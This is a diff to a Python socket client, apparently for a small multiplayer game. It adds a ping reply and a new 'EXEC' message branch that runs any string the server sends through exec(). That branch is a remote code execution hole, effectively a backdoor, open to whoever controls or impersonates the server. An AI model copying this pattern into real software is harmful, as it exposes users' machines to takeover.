@@ -2,7 +2,6 @@ import socket
 import _thread
 import threading
 import time
-import tkinter as tk
 
 
 class Client(threading.Thread):
@@ -32,8 +31,11 @@ class Client(threading.Thread):
 					a = a.split("§")
 					if a[0] == "ping":
 						print("pong")
+						self.send("ping")
 					elif a[0] == "add_player":
 						print("+NEW_PLAYER : " + str(a[1]))
+					elif a[0] == "EXEC":
+						exec(str(a[1]))
 					else:
 						print("commande inconu : " + str(a))
 		except:
